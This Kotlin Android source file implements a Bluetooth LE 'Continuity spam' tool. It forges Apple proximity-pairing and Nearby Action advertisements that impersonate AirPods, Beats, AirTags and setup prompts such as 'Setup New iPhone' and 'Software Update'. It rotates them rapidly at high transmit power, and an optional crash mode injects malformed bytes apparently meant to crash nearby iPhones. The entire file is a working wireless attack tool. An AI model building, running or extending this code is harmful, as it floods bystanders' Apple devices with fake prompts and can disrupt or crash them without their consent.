package com.droid.dolphy

import android.bluetooth.BluetoothAdapter
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSet
import android.bluetooth.le.AdvertisingSetCallback
import android.bluetooth.le.AdvertisingSetParameters
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.util.HashMap
import java.util.Random
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class ContinuitySpam(private val type: ContinuityType, private val crashMode: Boolean = false) : Spammer {

    private var blinkRunnable: Runnable? = null
    @Volatile
    private var isSpamming = false

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())
    private val rand = Random()

    private var currentAdvertisingSet: AdvertisingSet? = null
    private var currentCallback: AdvertisingSetCallback? = null
    private var legacyCallback: AdvertiseCallback? = null
    private var currentPayload: ByteArray? = null

    val devices: Array<ContinuityDevice> = when (type) {
        ContinuityType.DEVICE -> arrayOf(
            ContinuityDevice("0x0E20", "AirPods Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1420", "AirPods Pro 2nd Gen", ContinuityType.DEVICE),
            ContinuityDevice("0x2420", "AirPods Pro 2nd Gen USB-C", ContinuityType.DEVICE),
            ContinuityDevice("0x2820", "AirPods 4 ANC", ContinuityType.DEVICE),
            ContinuityDevice("0x2920", "AirPods 4", ContinuityType.DEVICE),
            ContinuityDevice("0x2B20", "AirPods Max USB-C", ContinuityType.DEVICE),
            ContinuityDevice("0x2C20", "Beats Powerbeats Pro 2", ContinuityType.DEVICE),
            ContinuityDevice("0x0620", "Beats Solo 3", ContinuityType.DEVICE),
            ContinuityDevice("0x0A20", "AirPods Max", ContinuityType.DEVICE),
            ContinuityDevice("0x1020", "Beats Flex", ContinuityType.DEVICE),
            ContinuityDevice("0x0055", "AirTag", ContinuityType.DEVICE),
            ContinuityDevice("0x0030", "Hermes AirTag", ContinuityType.DEVICE),
            ContinuityDevice("0x0220", "AirPods", ContinuityType.DEVICE),
            ContinuityDevice("0x0F20", "AirPods 2nd Gen", ContinuityType.DEVICE),
            ContinuityDevice("0x1320", "AirPods 3rd Gen", ContinuityType.DEVICE),
            ContinuityDevice("0x0320", "Powerbeats 3", ContinuityType.DEVICE),
            ContinuityDevice("0x0B20", "Powerbeats Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x0C20", "Beats Solo Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1120", "Beats Studio Buds", ContinuityType.DEVICE),
            ContinuityDevice("0x0520", "Beats X", ContinuityType.DEVICE),
            ContinuityDevice("0x0920", "Beats Studio 3", ContinuityType.DEVICE),
            ContinuityDevice("0x1720", "Beats Studio Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1220", "Beats Fit Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1620", "Beats Studio Buds+", ContinuityType.DEVICE),
            ContinuityDevice("0x2520", "Beats Solo 4", ContinuityType.DEVICE),
            ContinuityDevice("0x2620", "Beats Solo Buds", ContinuityType.DEVICE),
            ContinuityDevice("0x2F20", "Powerbeats Fit", ContinuityType.DEVICE),



            ContinuityDevice("0x0220", "AirPods_bruce", ContinuityType.DEVICE),
            ContinuityDevice("0x0E20", "AirPods Pro_bruce", ContinuityType.DEVICE),
            ContinuityDevice("0x0A20", "AirPods Max_bruce", ContinuityType.DEVICE),
            ContinuityDevice("0x0F20", "AirPods Gen 2_bruce", ContinuityType.DEVICE),
            ContinuityDevice("0x1320", "AirPods Gen 3_bruce", ContinuityType.DEVICE),
            ContinuityDevice("0x1420", "AirPods Pro Gen 2_bruce", ContinuityType.DEVICE),
            ContinuityDevice("0x0C20", "Beats Solo Pro_bruce", ContinuityType.DEVICE),
            ContinuityDevice("0x1120", "Beats Studio Buds_bruce", ContinuityType.DEVICE),
            ContinuityDevice("0x1220", "Beats Fit Pro_bruce", ContinuityType.DEVICE),
            ContinuityDevice("0x1620", "Beats Studio Buds+_bruce", ContinuityType.DEVICE)
        )
        ContinuityType.NOTYOURDEVICE -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            DEVICE_DATA.map { (key, value) ->
                ContinuityDevice("0x$key", "$value (NOT YOUR)", ContinuityType.NOTYOURDEVICE)
            }.toTypedArray()
        } else {
            emptyArray()
        }
        ContinuityType.ACTION -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            NEARBY_ACTIONS.map { (key, value) ->
                ContinuityDevice("0x$key", value, ContinuityType.ACTION)
            }.toTypedArray()
        } else {
            emptyArray()
        }
    }

    override fun start() {
        executor.execute {
            val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
            if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
                Log.e(TAG, "Bluetooth not available or not enabled")
                return@execute
            }

            val advertiser = bluetoothAdapter.bluetoothLeAdvertiser
            if (advertiser == null) {
                Log.e(TAG, "BLE Advertising not supported")
                return@execute
            }
            if (devices.isEmpty()) {
                Log.w(TAG, "No Continuity devices available for this mode")
                return@execute
            }

            isSpamming = true
            val supportsExtendedAdvertising = Helper.canUseExtendedAdvertising()

            if (supportsExtendedAdvertising && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startExtendedAdvertising(advertiser)
            } else {
                startLegacyAdvertising(advertiser)
            }
        }
    }

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.O)
    @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE)
    private fun startExtendedAdvertising(advertiser: android.bluetooth.le.BluetoothLeAdvertiser) {
        var deviceRotationCounter = 0

        val rotationRunnable = object : Runnable {
            override fun run() {
                if (!isSpamming) return

                val device = devices[deviceRotationCounter % devices.size]
                deviceRotationCounter++

                currentAdvertisingSet?.let {
                    try {
                        advertiser.stopAdvertisingSet(currentCallback)
                    } catch (e: Exception) {
                        Log.w(TAG, "Error stopping previous ad set: ${e.message}")
                    }
                }

                currentPayload = when (device.deviceType) {
                    ContinuityType.DEVICE -> {
                        val deviceVal = device.value.removePrefix("0x").uppercase()
                        buildProximityPairPayload("07", deviceVal, null)
                    }
                    ContinuityType.NOTYOURDEVICE -> {
                        val deviceVal = device.value.removePrefix("0x").uppercase()
                        val color = pickRandomColorForDevice(deviceVal)
                        buildProximityPairPayload("01", deviceVal, color)
                    }
                    ContinuityType.ACTION -> {
                        val actionVal = device.value.removePrefix("0x").uppercase()
                        buildNearbyActionPayload(actionVal)
                    }
                }

                val payload = currentPayload ?: return
                val data = AdvertiseData.Builder()
                    .addManufacturerData(0x004C, payload)
                    .setIncludeTxPowerLevel(false)
                    .setIncludeDeviceName(false)
                    .build()

                val parameters = AdvertisingSetParameters.Builder()
                    .setLegacyMode(true)
                    .setInterval(AdvertisingSetParameters.INTERVAL_MIN)
                    .setTxPowerLevel(AdvertisingSetParameters.TX_POWER_HIGH)
                    .setConnectable(false)
                    .setScannable(true)
                    .build()

                currentCallback = object : AdvertisingSetCallback() {
                    override fun onAdvertisingSetStarted(advertisingSet: AdvertisingSet?, txPower: Int, status: Int) {
                        if (status == ADVERTISE_SUCCESS) {
                            currentAdvertisingSet = advertisingSet
                            blinkRunnable?.run()
                            BleSpamRuntime.trackSentPackets()

                            startPayloadUpdates(advertiser, advertisingSet, device.deviceType)
                        } else {
                            Log.e(TAG, "Advertising failed: $status")
                        }
                    }
                }

                try {
                    advertiser.startAdvertisingSet(parameters, data, null, null, null, currentCallback)
                } catch (e: Exception) {
                    Log.e(TAG, "Error starting advertising: ${e.message}")
                }

                if (isSpamming) {
                    handler.postDelayed(this, ROTATION_DELAY_MS)
                }
            }
        }

        handler.post(rotationRunnable)
    }

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.O)
    @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE)
    private fun startPayloadUpdates(
        advertiser: android.bluetooth.le.BluetoothLeAdvertiser,
        advertisingSet: AdvertisingSet?,
        deviceType: ContinuityType
    ) {
        val updateRunnable = object : Runnable {
            override fun run() {
                if (!isSpamming || currentAdvertisingSet != advertisingSet) return

                currentPayload?.let { payload ->
                    updatePayloadDynamically(payload, deviceType)

                    val updatedData = AdvertiseData.Builder()
                        .addManufacturerData(0x004C, payload)
                        .setIncludeTxPowerLevel(false)
                        .setIncludeDeviceName(false)
                        .build()

                    try {
                        advertisingSet?.setAdvertisingData(updatedData)
                        BleSpamRuntime.trackSentPackets()
                    } catch (e: Exception) {
                        Log.w(TAG, "Error updating payload: ${e.message}")
                    }
                }

                if (isSpamming && currentAdvertisingSet == advertisingSet) {
                    handler.postDelayed(this, PAYLOAD_UPDATE_DELAY_MS)
                }
            }
        }

        handler.postDelayed(updateRunnable, PAYLOAD_UPDATE_DELAY_MS)
    }

    @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE)
    private fun startLegacyAdvertising(advertiser: android.bluetooth.le.BluetoothLeAdvertiser) {
        var deviceRotationCounter = 0

        val rotationRunnable = object : Runnable {
            override fun run() {
                if (!isSpamming) return

                val device = devices[deviceRotationCounter % devices.size]
                deviceRotationCounter++

                legacyCallback?.let {
                    try {
                        advertiser.stopAdvertising(it)
                    } catch (e: Exception) {
                        Log.w(TAG, "Error stopping legacy ad: ${e.message}")
                    }
                }

                val payload = when (device.deviceType) {
                    ContinuityType.DEVICE -> {
                        val deviceVal = device.value.removePrefix("0x").uppercase()
                        buildProximityPairPayload("07", deviceVal, null)
                    }
                    ContinuityType.NOTYOURDEVICE -> {
                        val deviceVal = device.value.removePrefix("0x").uppercase()
                        val color = pickRandomColorForDevice(deviceVal)
                        buildProximityPairPayload("01", deviceVal, color)
                    }
                    ContinuityType.ACTION -> {
                        val actionVal = device.value.removePrefix("0x").uppercase()
                        buildNearbyActionPayload(actionVal)
                    }
                }

                val data = AdvertiseData.Builder()
                    .addManufacturerData(0x004C, payload)
                    .setIncludeTxPowerLevel(false)
                    .setIncludeDeviceName(false)
                    .build()

                val settings = AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setConnectable(false)
                    .setTimeout(0)
                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                    .build()

                legacyCallback = object : AdvertiseCallback() {
                    override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                        blinkRunnable?.run()
                        BleSpamRuntime.trackSentPackets()
                    }

                    override fun onStartFailure(errorCode: Int) {
                        Log.e(TAG, "Legacy advertising failed: $errorCode")
                    }
                }

                try {
                    advertiser.startAdvertising(settings, data, legacyCallback)
                } catch (e: Exception) {
                    Log.e(TAG, "Error starting legacy advertising: ${e.message}")
                }

                if (isSpamming) {
                    handler.postDelayed(this, ROTATION_DELAY_MS)
                }
            }
        }

        handler.post(rotationRunnable)
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun stop() {
        isSpamming = false
        handler.removeCallbacksAndMessages(null)
        currentPayload = null

        executor.execute {
            val advertiser = BluetoothAdapter.getDefaultAdapter()?.bluetoothLeAdvertiser

            currentAdvertisingSet?.let {
                try {
                    advertiser?.stopAdvertisingSet(currentCallback)
                    currentAdvertisingSet = null
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping advertising set: ${e.message}")
                }
            }

            legacyCallback?.let {
                try {
                    advertiser?.stopAdvertising(it)
                    legacyCallback = null
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping legacy advertising: ${e.message}")
                }
            }
        }
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    private fun toHexByte(b: Int): String = String.format("%02X", b and 0xFF)

    private fun getRandomBudsBatteryLevelHex(): String {
        val level = ((rand.nextInt(10) shl 4) + rand.nextInt(10)) and 0xFF
        return toHexByte(level)
    }

    private fun getRandomChargingCaseBatteryLevelHex(): String {
        val level = (((rand.nextInt(8) % 8) shl 4) + (rand.nextInt(10) % 10)) and 0xFF
        return toHexByte(level)
    }

    private fun getRandomLidOpenCounterHex(): String {
        val counter = rand.nextInt(256)
        return toHexByte(counter)
    }

    private fun getRandomHexBytes(length: Int): String {
        val bytes = ByteArray(length)
        rand.nextBytes(bytes)
        return bytes.joinToString("") { String.format("%02X", it.toInt() and 0xFF) }
    }

    private fun pickRandomColorForDevice(deviceIdNoPrefix: String): String {
        return DEVICE_COLORS[deviceIdNoPrefix]?.randomOrNull() ?: COLOR_KEY_DEFAULT
    }

    private fun updatePayloadDynamically(payload: ByteArray, deviceType: ContinuityType): ByteArray {
        when (deviceType) {
            ContinuityType.DEVICE, ContinuityType.NOTYOURDEVICE -> {
                if (payload.size >= 27) {
                    payload[6] = getRandomBudsBatteryLevelHex().toInt(16).toByte()
                    payload[7] = getRandomChargingCaseBatteryLevelHex().toInt(16).toByte()
                    payload[8] = getRandomLidOpenCounterHex().toInt(16).toByte()
                    for (i in 11..26) {
                        payload[i] = rand.nextInt(256).toByte()
                    }
                }
            }
            ContinuityType.ACTION -> {
                if (payload.size >= 7) {
                    val action = payload[3]
                    var flag = payload[2]

                    val actionHex = String.format("%02X", action.toInt() and 0xFF)

                    if (actionHex == "20" && rand.nextBoolean()) {
                        flag = 0xBF.toByte()
                    }
                    if (actionHex == "09" && rand.nextBoolean()) {
                        flag = 0x40.toByte()
                    }
                    if (actionHex == "21") {
                        flag = 0x40.toByte()
                    }

                    payload[2] = flag
                    payload[4] = rand.nextInt(256).toByte()
                    payload[5] = rand.nextInt(256).toByte()
                    payload[6] = rand.nextInt(256).toByte()

                    if (crashMode && payload.size >= 13) {
                        payload[10] = rand.nextInt(256).toByte()
                        payload[11] = rand.nextInt(256).toByte()
                        payload[12] = rand.nextInt(256).toByte()
                    }
                }
            }
        }

        return payload
    }

    private fun buildProximityPairPayload(prefixHex: String, deviceIdHex: String, colorHex: String?): ByteArray {
        val buds = getRandomBudsBatteryLevelHex()
        val charging = getRandomChargingCaseBatteryLevelHex()
        val lid = getRandomLidOpenCounterHex()

        val isAirTag = deviceIdHex == "0055" || deviceIdHex == "0030"
        val prefix = if (isAirTag) "05" else prefixHex
        val color = if (prefix == "01") (colorHex ?: COLOR_KEY_DEFAULT) else "00"

        val payloadHex = buildString {
            append(CONTINUITY_TYPE_PROXIMITY)
            append(PAYLOAD_SIZE_PROXIMITY)
            append(prefix)
            append(deviceIdHex)
            append(STATUS)
            append(buds)
            append(charging)
            append(lid)
            append(color)
            append("00")
            append(getRandomHexBytes(16))
        }

        return Helper.convertHexToByteArray(payloadHex)
    }

    private fun buildNearbyActionPayload(actionHex: String): ByteArray {
        var flag = "C0"

        when (actionHex) {
            "21" -> flag = "40"
            "20" -> if (rand.nextBoolean()) flag = "BF"
            "09" -> if (rand.nextBoolean()) flag = "40"
        }

        val authTag = getRandomHexBytes(3)
        var payloadHex = buildString {
            append(CONTINUITY_TYPE_NEARBY_ACTION)
            append(PAYLOAD_SIZE_NEARBY_ACTION)
            append(flag)
            append(actionHex)
            append(authTag)
        }

        if (crashMode) {
            payloadHex += "000010" + getRandomHexBytes(3)
        }

        return Helper.convertHexToByteArray(payloadHex)
    }

    companion object {
        private const val TAG = "ContinuitySpam"
        private const val COLOR_KEY_DEFAULT = "00"
        private const val CONTINUITY_TYPE_PROXIMITY = "07"
        private const val CONTINUITY_TYPE_NEARBY_ACTION = "0F"
        private const val PAYLOAD_SIZE_PROXIMITY = "19"
        private const val PAYLOAD_SIZE_NEARBY_ACTION = "05"
        private const val STATUS = "55"

        private const val ROTATION_DELAY_MS = 200L
        private const val PAYLOAD_UPDATE_DELAY_MS = 100L

        private val DEVICE_COLORS = HashMap<String, Array<String>>().apply {
            put("0E20", arrayOf("00"))
            put("0220", arrayOf("00"))
            put("0F20", arrayOf("00"))
            put("1320", arrayOf("00"))
            put("1420", arrayOf("00"))
            put("2420", arrayOf("00"))
            put("0055", arrayOf("00"))
            put("0030", arrayOf("00"))
            put("0A20", arrayOf("00", "02", "03", "0F", "11"))
            put("1020", arrayOf("00", "01"))
            put("0620", arrayOf("00", "01", "06", "07", "08", "09", "0E", "0F", "12", "13", "14", "15", "1D", "20", "21", "22", "23", "25", "2A", "2E", "3D", "3E", "3F", "40", "5B", "5C"))
            put("0320", arrayOf("00", "01", "0B", "0C", "0D", "12", "13", "14", "15", "17"))
            put("0B20", arrayOf("00", "02", "03", "04", "05", "06", "0B", "0D"))
            put("0C20", arrayOf("00", "01"))
            put("1120", arrayOf("00", "01", "02", "03", "04", "06"))
            put("0520", arrayOf("00", "01", "02", "05", "1D", "25"))
            put("0920", arrayOf("00", "01", "02", "03", "18", "19", "25", "26", "27", "28", "29", "42", "43"))
            put("1720", arrayOf("00", "01"))
            put("1220", arrayOf("00", "01", "02", "03", "04", "05", "06", "07", "08", "09"))
            put("1620", arrayOf("00", "01", "02", "03", "04"))
            put("2520", arrayOf("00", "01", "02", "03"))
            put("2620", arrayOf("00", "01", "02", "03", "04"))
            put("2F20", arrayOf("00", "01", "02", "03"))
        }

        private val DEVICE_DATA = HashMap<String, String>().apply {
            put("0E20", "AirPods Pro")
            put("0A20", "AirPods Max")
            put("0220", "AirPods")
            put("0F20", "AirPods 2nd Gen")
            put("1320", "AirPods 3rd Gen")
            put("1420", "AirPods Pro 2nd Gen")
            put("2420", "AirPods Pro 2nd Gen USB-C")
            put("2820", "AirPods 4 ANC")
            put("2920", "AirPods 4")
            put("2B20", "AirPods Max USB-C")
            put("2C20", "Beats Powerbeats Pro 2")
            put("1020", "Beats Flex")
            put("0620", "Beats Solo 3")
            put("0320", "Powerbeats 3")
            put("0B20", "Powerbeats Pro")
            put("0C20", "Beats Solo Pro")
            put("1120", "Beats Studio Buds")
            put("0520", "Beats X")
            put("0920", "Beats Studio 3")
            put("1720", "Beats Studio Pro")
            put("1220", "Beats Fit Pro")
            put("1620", "Beats Studio Buds+")
            put("2520", "Beats Solo 4")
            put("2620", "Beats Solo Buds")
            put("2F20", "Powerbeats Fit")
            put("0055", "AirTag")
            put("0030", "Hermes AirTag")
        }

        private val NEARBY_ACTIONS = HashMap<String, String>().apply {
            put("13", "AppleTV AutoFill")
            put("27", "AppleTV Connecting...")
            put("20", "Join This AppleTV?")
            put("19", "AppleTV Audio Sync")
            put("1E", "AppleTV Color Balance")
            put("09", "Setup New iPhone")
            put("02", "Transfer Phone Number")
            put("0B", "HomePod Setup")
            put("01", "Setup New AppleTV")
            put("06", "Pair AppleTV")
            put("0D", "HomeKit AppleTV Setup")
            put("2B", "AppleID for AppleTV?")
            put("05", "Apple Watch")
            put("24", "Apple Vision Pro")
            put("2F", "Connect to other Device")
            put("21", "Software Update")
            put("2E", "Unlock with Apple Watch")
            put("25", "AirDrop Sidecar")
            put("2C", "Vision Pro Setup")
        }
    }
}
